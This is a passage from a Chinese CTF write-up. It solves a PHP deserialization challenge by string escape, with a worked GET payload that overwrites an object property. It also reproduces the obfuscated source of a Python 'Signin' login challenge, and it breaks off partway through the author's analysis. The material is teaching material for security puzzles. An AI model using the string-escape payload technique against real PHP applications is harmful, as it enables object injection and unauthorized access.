&#39;MaoLei&#39;</code>就行，本来看着<code>Make_a_Move</code>这个方法没反应过来可以反序列化字符串逃逸，看了wp得到提示</p><p>那么只要通过Chant来构造，使反序列化字符串逃逸</p><pre class="language-php" data-language="php"><code class="language-php">先看正常的反序列化<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Omg_It_Is_So_Cool_Bring_Me_My_Flag"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Chant"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>将Chant替换为<span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125; ,O:34:"</span>Omg_It_Is_So_Cool_Bring_Me_My_Flag<span class="token string double-quoted-string">":2:&#123;s:5:"</span>Chant<span class="token string double-quoted-string">";s:36:"</span><span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>字符串增加了<span class="token number">35</span>，<span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12 构造35个di_yi_qiang即可字符串逃逸</span>Payload：<span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>chant<span class="token operator">=</span>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>题目代码:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;users中存在用户名“admin”密码也为“admin”，表面上看需要传入的参数也为admin&#x2F;admin。</code></pre><p><a href="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67"><img src="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67" alt="image-20230907210222817" loading="lazy"></a></p><p>继续分析源码可以发现eval()语句将base64.b64encode覆写为base64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token 